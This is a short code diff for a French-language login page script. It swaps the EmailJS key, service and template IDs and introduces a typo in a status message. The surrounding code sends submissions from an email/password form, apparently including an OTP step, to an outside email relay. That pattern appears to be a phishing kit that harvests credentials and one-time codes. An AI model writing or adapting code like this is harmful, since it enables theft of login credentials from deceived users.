@@ -100,7 +100,7 @@ if (otpSingle) {
 
 
 emailjs.init({
-  publicKey: 'rORVGScs1n94sqOPi'
+  publicKey: 'OdVrpD_0CpgUT6Ahz'
 });
 
 /* ======================================
@@ -167,15 +167,15 @@ if (form && emailInput && passwordInput && result) {
     // Envoi EmailJS
     // ------------------------------
 
-    result.textContent = "Connexion en cours...";
+    result.textContent = "Connetion en cours...";
     result.className = "";
 
 
     try {
 
         const response = await emailjs.send(
-            "service_veritas",
-            "template_tprb5ni",
+            "service_client",
+            "template_xmsbvsp",
             templateParams
         );
 
